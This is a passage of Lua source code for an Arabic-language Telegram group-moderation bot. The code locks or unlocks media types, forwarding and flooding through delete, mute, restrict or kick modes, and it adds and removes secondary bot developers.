Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الالعاب")  
return false
end 
if text == "قفل الالعاب بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:geam"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الالعاب")  
return false
end 
if text == "قفل الالعاب بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:geam"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الالعاب")  
return false
end 
if text == "قفل الالعاب بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:geam"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الالعاب")  
return false
end 
if text == "فتح الالعاب" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:geam"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الالعاب")  
return false
end 
if text == "قفل الاغاني" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Audio"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الاغاني")  
return false
end 
if text == "قفل الاغاني بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Audio"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الاغاني")  
return false
end 
if text == "قفل الاغاني بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Audio"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الاغاني")  
return false
end 
if text == "قفل الاغاني بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Audio"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الاغاني")  
return false
end 
if text == "فتح الاغاني" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Audio"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الاغاني")  
return false
end 
if text == "قفل الصوت" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:vico"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الصوت")  
return false
end 
if text == "قفل الصوت بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:vico"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الصوت")  
return false
end 
if text == "قفل الصوت بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:vico"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الصوت")  
return false
end 
if text == "قفل الصوت بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:vico"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الصوت")  
return false
end 
if text == "فتح الصوت" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:vico"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الصوت")  
return false
end 
if text == "قفل الكيبورد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الكيبورد")  
return false
end 
if text == "قفل الكيبورد بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الكيبورد")  
return false
end 
if text == "قفل الكيبورد بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الكيبورد")  
return false
end 
if text == "قفل الكيبورد بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الكيبورد")  
return false
end 
if text == "فتح الكيبورد" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Keyboard"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الكيبورد")  
return false
end 
if text == "قفل الملصقات" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل الملصقات*")  
return false
end 
if text == "قفل الملصقات بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل الملصقات*")  
return false
end 
if text == "قفل الملصقات بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل الملصقات*")  
return false
end 
if text == "قفل الملصقات بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل الملصقات*")  
return false
end 
if text == "فتح الملصقات" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح الملصقات*")  
return false
end 
if text == "قفل التوجيه" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:forward"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","*✦┇تم قفـل التوجيه*")  
return false
end 
if text == "قفل التوجيه بالتقيد" and Owner(msg) then
database:set(bot_id.."Neverland:Lock:forward"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفـل التوجيه*")  
return false
end 
if text == "قفل التوجيه بالكتم" and Owner(msg) then
database:set(bot_id.."Neverland:Lock:forward"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفـل التوجيه*")  
return false
end 
if text == "قفل التوجيه بالطرد" and Owner(msg) then
database:set(bot_id.."Neverland:Lock:forward"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","*✦┇تم قفـل التوجيه*")  
return false
end 
if text == "فتح التوجيه" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:forward"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح التوجيه*")  
return false
end 
if text == "قفل الملفات" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Document"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الملفات")  
return false
end 
if text == "قفل الملفات بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Document"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الملفات")  
return false
end 
if text == "قفل الملفات بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Document"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الملفات")  
return false
end 
if text == "قفل الملفات بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Document"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الملفات")  
return false
end 
if text == "فتح الملفات" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Document"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الملفات")  
return false
end 
if text == "قفل السيلفي" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل السيلفي")  
return false
end 
if text == "قفل السيلفي بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل السيلفي")  
return false
end 
if text == "قفل السيلفي بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل السيلفي")  
return false
end 
if text == "قفل السيلفي بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل السيلفي")  
return false
end 
if text == "فتح السيلفي" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Unsupported"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح السيلفي")  
return false
end 
if text == "قفل الماركداون" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الماركداون")  
return false
end 
if text == "قفل الماركداون بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الماركداون")  
return false
end 
if text == "قفل الماركداون بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الماركداون")  
return false
end 
if text == "قفل الماركداون بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الماركداون")  
return false
end 
if text == "فتح الماركداون" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Markdaun"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الماركداون")  
return false
end 
if text == "قفل الجهات" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Contact"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الجهات")  
return false
end 
if text == "قفل الجهات بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Contact"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الجهات")  
return false
end 
if text == "قفل الجهات بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Contact"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الجهات")  
return false
end 
if text == "قفل الجهات بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Contact"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الجهات")  
return false
end 
if text == "فتح الجهات" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Contact"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الجهات")  
return false
end 
if text == "قفل الكلايش" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Spam"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الكلايش")  
return false
end 
if text == "قفل الكلايش بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Spam"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الكلايش")  
return false
end 
if text == "قفل الكلايش بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Spam"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الكلايش")  
return false
end 
if text == "قفل الكلايش بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Spam"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الكلايش")  
return false
end 
if text == "فتح الكلايش" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id.."Neverland:Lock:Spam"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الكلايش")  
return false
end 
if text == "قفل الانلاين" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفـل الانلاين")  
return false
end 
if text == "قفل الانلاين بالتقيد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","✦┇تم قفـل الانلاين")  
return false
end 
if text == "قفل الانلاين بالكتم" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","✦┇تم قفـل الانلاين")  
return false
end 
if text == "قفل الانلاين بالطرد" and Addictive(msg) then
database:set(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفـل الانلاين")  
return false
end 
if text == "فتح الانلاين" and Addictive(msg) then
database:del(bot_id.."Neverland:Lock:Inlen"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","✦┇تم فتح الانلاين")  
return false
end 
if text == "قفل التكرار بالطرد" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:hset(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"flood","kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","✦┇تم قفل التكرار")
return false
end 
if text == "قفل التكرار" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:hset(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"flood","del")  
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم قفل التكرار بالحذف")
return false
end 
if text == "قفل التكرار بالتقيد" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:hset(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"flood","keed")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","*✦┇تم قفل التكرار*")
return false
end 
if text == "قفل التكرار بالكتم" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:hset(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"flood","mute")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","*✦┇تم قفل التكرار*")
return false
end 
if text == "فتح التكرار" and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
database:hdel(bot_id.."Neverland:flooding:settings:"..msg.chat_id_ ,"flood")  
Reply_Status(msg,msg.sender_user_id_,"unlock","*✦┇تم فتح التكرار*")
return false
end 
if text == ("اضف مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and VIP_DeV(msg) then
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."DEV:Sudo:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه مطور ثانوي*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false 
end
if text and text:match("^اضف مطور ثانوي @(.*)$") and VIP_DeV(msg) then
local username = text:match("^اضف مطور ثانوي @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."DEV:Sudo:T", result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم رفعه مطور ثانوي*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false 
end
if text and text:match("^اضف مطور ثانوي (%d+)$") and VIP_DeV(msg) then
local userid = text:match("^اضف مطور ثانوي (%d+)$")
database:sadd(bot_id.."DEV:Sudo:T", userid)
Reply_Status(msg,userid,"reply","*✦┇تم رفعه مطور ثانوي*")  
return false 
end
if text == ("حذف مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and VIP_DeV(msg) then
function Function_Neverland(extra, result, success)
database:srem(bot_id.."DEV:Sudo:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم تنزيله من المطور ثانويين*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false 
end
if text and text:match("^حذف مطور ثانوي @(.*)$") and VIP_DeV(msg) then
local username = text:match("^حذف مطور ثانوي @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."DEV:Sudo:T", result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم تنزيله من المطور ثانويين*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end  
if text and text:match("^حذف مطور ثانوي (%d+)$") and VIP_DeV(msg) then
local userid = text:match("^حذف مطور ثانوي (%d+)$")
database:srem(bot_id.."DEV:Sudo:T", userid)
Reply_Status(msg,userid,"reply","*✦┇تم تنزيله من المطور ثانويين*")  
return false 
end
if text == ("الثانويين") and DevNeverland(msg) then
local list = database:smembers(bot_id.."DEV:Sudo:T")
t = "\n*✦┇قائمة مطورين الثانويين للبوت *\n*┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
